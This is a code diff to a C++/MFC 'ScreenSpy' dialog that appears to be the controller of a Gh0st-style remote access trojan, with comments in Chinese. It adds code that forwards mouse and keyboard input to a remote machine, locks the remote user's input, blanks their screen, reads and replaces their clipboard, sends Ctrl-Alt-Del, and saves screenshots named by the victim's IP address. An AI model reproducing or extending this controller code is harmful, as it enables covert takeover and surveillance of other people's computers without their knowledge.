@@ -83,6 +83,7 @@ BEGIN_MESSAGE_MAP(CScreenSpyDlg, CDialog)
 	ON_WM_GETMINMAXINFO()
 	ON_WM_HSCROLL()
 	ON_WM_PAINT()
+	ON_WM_SYSCOMMAND()
 END_MESSAGE_MAP()
 
 
@@ -99,10 +100,13 @@ void CScreenSpyDlg::OnClose()
 	::ReleaseDC(m_hWnd, m_hDC);
 	DeleteObject(m_hFullBitmap);
 
+	//关闭会进来两次，为了避免崩溃判断一下
 	if (m_lpbmi)
 		delete m_lpbmi;
+	m_lpbmi = NULL;
 	if (m_lpbmi_rect)
 		delete m_lpbmi_rect;
+	m_lpbmi_rect = NULL;
 	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_ARROW));
 
 	m_bIsCtrl = false;
@@ -572,4 +576,300 @@ void CScreenSpyDlg::UpdateLocalClipboard(char *buf, int len)
 		GlobalFree(hglbCopy);
 	}
 	CloseClipboard();
+}
+
+#define MAKEDWORD(h,l)        (((unsigned long)h << 16) | l)
+
+//用来截获消息的。我们可以通过重载它来处理键盘和鼠标消息。
+BOOL CScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
+{
+	// TODO: 在此添加专用代码和/或调用基类
+
+
+	CRect rect;
+	GetClientRect(&rect);
+
+	switch (pMsg->message)
+	{
+	case WM_LBUTTONDOWN:
+	case WM_LBUTTONUP:
+	case WM_RBUTTONDOWN:
+	case WM_RBUTTONUP:
+	case WM_MOUSEMOVE:
+	case WM_LBUTTONDBLCLK:
+	case WM_RBUTTONDBLCLK:
+	case WM_MBUTTONDOWN:
+	case WM_MBUTTONUP:
+	case WM_MOUSEWHEEL:
+	{
+		MSG	msg;
+		memcpy(&msg, pMsg, sizeof(MSG));
+		msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_VScrollPos, LOWORD(pMsg->lParam) + m_HScrollPos);
+		msg.pt.x += m_HScrollPos;
+		msg.pt.y += m_VScrollPos;
+		SendCommand(&msg);
+	}
+	break;
+	case WM_KEYDOWN:
+	case WM_KEYUP:
+	case WM_SYSKEYDOWN:
+	case WM_SYSKEYUP:
+		if (pMsg->wParam != VK_LWIN && pMsg->wParam != VK_RWIN)
+		{
+			MSG	msg;
+			memcpy(&msg, pMsg, sizeof(MSG));
+			msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_VScrollPos, LOWORD(pMsg->lParam) + m_HScrollPos);
+			msg.pt.x += m_HScrollPos;
+			msg.pt.y += m_VScrollPos;
+			SendCommand(&msg);
+		}
+		if (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE)
+			return true;
+		break;
+	default:
+		break;
+	}
+	return CDialog::PreTranslateMessage(pMsg);
+}
+
+
+void CScreenSpyDlg::SendCommand(MSG* pMsg)
+{
+	if (!m_bIsCtrl)
+		return;
+
+	LPBYTE lpData = new BYTE[sizeof(MSG) + 1];
+	lpData[0] = COMMAND_SCREEN_CONTROL;
+	memcpy(lpData + 1, pMsg, sizeof(MSG));
+	m_iocpServer->Send(m_pContext, lpData, sizeof(MSG) + 1);
+
+	delete[] lpData;
+}
+
+void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
+{
+	// TODO: 在此添加消息处理程序代码和/或调用默认值
+	CMenu* pSysMenu = GetSystemMenu(FALSE);
+	switch (nID)
+	{
+	case IDM_CONTROL:
+	{
+		m_bIsCtrl = !m_bIsCtrl;
+		pSysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);
+
+		if (m_bIsCtrl)
+		{
+			if (m_bIsTraceCursor)
+				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
+			else
+				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_hRemoteCursor);
+		}
+		else
+			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
+	}
+	break;
+	case IDM_SEND_CTRL_ALT_DEL:
+	{
+		BYTE	bToken = COMMAND_SCREEN_CTRL_ALT_DEL;
+		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
+	}
+	break;
+	case IDM_TRACE_CURSOR: // 跟踪服务端鼠标
+	{
+		m_bIsTraceCursor = !m_bIsTraceCursor;
+		pSysMenu->CheckMenuItem(IDM_TRACE_CURSOR, m_bIsTraceCursor ? MF_CHECKED : MF_UNCHECKED);
+		if (m_bIsCtrl)
+		{
+			if (!m_bIsTraceCursor)
+				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_hRemoteCursor);
+			else
+				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
+		}
+		// 重绘消除或显示鼠标
+		OnPaint();
+	}
+	break;
+	case IDM_BLOCK_INPUT: // 锁定服务端鼠标和键盘
+	{
+		bool bIsChecked = pSysMenu->GetMenuState(IDM_BLOCK_INPUT, MF_BYCOMMAND) & MF_CHECKED;
+		pSysMenu->CheckMenuItem(IDM_BLOCK_INPUT, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
+
+		BYTE	bToken[2];
+		bToken[0] = COMMAND_SCREEN_BLOCK_INPUT;
+		bToken[1] = !bIsChecked;
+		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
+	}
+	break;
+	case IDM_BLANK_SCREEN: // 服务端黑屏
+	{
+		bool bIsChecked = pSysMenu->GetMenuState(IDM_BLANK_SCREEN, MF_BYCOMMAND) & MF_CHECKED;
+		pSysMenu->CheckMenuItem(IDM_BLANK_SCREEN, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
+
+		BYTE	bToken[2];
+		bToken[0] = COMMAND_SCREEN_BLANK;
+		bToken[1] = !bIsChecked;
+		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
+	}
+	break;
+	case IDM_CAPTURE_LAYER: // 捕捉层
+	{
+		bool bIsChecked = pSysMenu->GetMenuState(IDM_CAPTURE_LAYER, MF_BYCOMMAND) & MF_CHECKED;
+		pSysMenu->CheckMenuItem(IDM_CAPTURE_LAYER, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
+
+		BYTE	bToken[2];
+		bToken[0] = COMMAND_SCREEN_CAPTURE_LAYER;
+		bToken[1] = !bIsChecked;
+		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
+	}
+	break;
+	case IDM_SAVEDIB:
+		SaveSnapshot();
+		break;
+	case IDM_GET_CLIPBOARD: // 获取剪贴板
+	{
+		BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD;
+		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
+	}
+	break;
+	case IDM_SET_CLIPBOARD: // 设置剪贴板
+	{
+		SendLocalClipboard();
+	}
+	break;
+	case IDM_ALGORITHM_SCAN: // 隔行扫描算法
+	{
+		SendResetAlgorithm(ALGORITHM_SCAN);
+		pSysMenu->CheckMenuRadioItem(IDM_ALGORITHM_SCAN, IDM_ALGORITHM_DIFF, IDM_ALGORITHM_SCAN, MF_BYCOMMAND);
+	}
+	break;
+	case IDM_ALGORITHM_DIFF: // 差异比较算法
+	{
+		SendResetAlgorithm(ALGORITHM_DIFF);
+		pSysMenu->CheckMenuRadioItem(IDM_ALGORITHM_SCAN, IDM_ALGORITHM_DIFF, IDM_ALGORITHM_DIFF, MF_BYCOMMAND);
+	}
+	break;
+	case IDM_DEEP_1:
+	{
+		SendResetScreen(1);
+		pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_1, MF_BYCOMMAND);
+	}
+	break;
+	case IDM_DEEP_4_GRAY:
+	{
+		SendResetScreen(3);
+		pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_4_GRAY, MF_BYCOMMAND);
+	}
+	break;
+	case IDM_DEEP_4_COLOR:
+	{
+		SendResetScreen(4);
+		pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_4_COLOR, MF_BYCOMMAND);
+	}
+	break;
+	case IDM_DEEP_8_GRAY:
+	{
+		SendResetScreen(7);
+		pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_8_GRAY, MF_BYCOMMAND);
+	}
+	break;
+	case IDM_DEEP_8_COLOR:
+	{
+		SendResetScreen(8);
+		pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_8_COLOR, MF_BYCOMMAND);
+	}
+	break;
+	case IDM_DEEP_16:
+	{
+		SendResetScreen(16);
+		pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_16, MF_BYCOMMAND);
+	}
+	break;
+	case IDM_DEEP_32:
+	{
+		SendResetScreen(32);
+		pSysMenu->CheckMenuRadioItem(IDM_DEEP_4_GRAY, IDM_DEEP_32, IDM_DEEP_32, MF_BYCOMMAND);
+	}
+	break;
+	default:
+		CDialog::OnSysCommand(nID, lParam);
+	}
+	CDialog::OnSysCommand(nID, lParam);
+}
+
+
+bool CScreenSpyDlg::SaveSnapshot(void)
+{
+	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.bmp");
+	CFileDialog dlg(FALSE, "bmp", strFileName, OFN_OVERWRITEPROMPT, "位图文件(*.bmp)|*.bmp|", this);
+	if (dlg.DoModal() != IDOK)
+		return false;
+
+	BITMAPFILEHEADER	hdr;
+	LPBITMAPINFO		lpbi = m_lpbmi;
+	CFile	file;
+	if (!file.Open(dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
+	{
+		MessageBox("文件保存失败");
+		return false;
+	}
+
+	// BITMAPINFO大小
+	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);
+
+	// Fill in the fields of the file header
+	hdr.bfType = ((WORD)('M' << 8) | 'B');	// is always "BM"
+	hdr.bfSize = lpbi->bmiHeader.biSizeImage + sizeof(hdr);
+	hdr.bfReserved1 = 0;
+	hdr.bfReserved2 = 0;
+	hdr.bfOffBits = sizeof(hdr) + nbmiSize;
+	// Write the file header
+	file.Write(&hdr, sizeof(hdr));
+	file.Write(lpbi, nbmiSize);
+	// Write the DIB header and the bits
+	file.Write(m_lpScreenDIB, lpbi->bmiHeader.biSizeImage);
+	file.Close();
+
+	return true;
+
+}
+void CScreenSpyDlg::SendLocalClipboard(void)
+{
+	if (!::OpenClipboard(NULL))
+		return;
+	HGLOBAL hglb = GetClipboardData(CF_TEXT);
+	if (hglb == NULL)
+	{
+		::CloseClipboard();
+		return;
+	}
+	int	nPacketLen = GlobalSize(hglb) + 1;
+	LPSTR lpstr = (LPSTR)GlobalLock(hglb);
+	LPBYTE	lpData = new BYTE[nPacketLen];
+	lpData[0] = COMMAND_SCREEN_SET_CLIPBOARD;
+	memcpy(lpData + 1, lpstr, nPacketLen - 1);
+	::GlobalUnlock(hglb);
+	::CloseClipboard();
+	m_iocpServer->Send(m_pContext, lpData, nPacketLen);
+	delete[] lpData;
+}
+
+
+void CScreenSpyDlg::SendResetAlgorithm(UINT nAlgorithm)
+{
+	BYTE	bBuff[2];
+	bBuff[0] = COMMAND_ALGORITHM_RESET;
+	bBuff[1] = nAlgorithm;
+	m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff));
+}
+
+
+void CScreenSpyDlg::SendResetScreen(int nBitCount)
+{
+
+	m_nBitCount = nBitCount;
+
+	BYTE	bBuff[2];
+	bBuff[0] = COMMAND_SCREEN_RESET;
+	bBuff[1] = m_nBitCount;
+	m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff));
 }
